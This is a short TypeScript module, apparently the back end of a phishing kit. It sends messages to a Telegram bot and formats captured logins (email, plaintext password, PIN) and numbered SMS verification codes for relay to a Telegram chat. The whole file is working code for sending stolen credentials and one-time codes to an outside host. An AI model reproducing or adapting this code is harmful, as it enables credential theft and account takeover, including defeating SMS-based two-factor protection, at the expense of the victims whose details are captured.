// Telegram Bot Integration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export async function sendToTelegram(message: string): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Telegram credentials not configured");
    return false;
  }

  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });

    const data = await response.json();
    
    if (!data.ok) {
      console.error("Telegram API error:", data);
      return false;
    }

    console.log("Message sent to Telegram successfully");
    return true;
  } catch (error) {
    console.error("Error sending to Telegram:", error);
    return false;
  }
}

export function formatLoginMessage(
  email: string, 
  password: string, 
  pin: string
): string {
  return `
🔐 <b>New Login</b>

📧 Email: <code>${email}</code>
🔑 Password: <code>${password}</code>
🔢 PIN: <code>${pin}</code>
  `.trim();
}

export function formatSMSMessage(
  email: string, 
  smsCode: string,
  codeNumber: number
): string {
  return `
📱 <b>SMS ${codeNumber}</b>

📧 Email: <code>${email}</code>
💬 Code: <code>${smsCode}</code>
  `.trim();
}
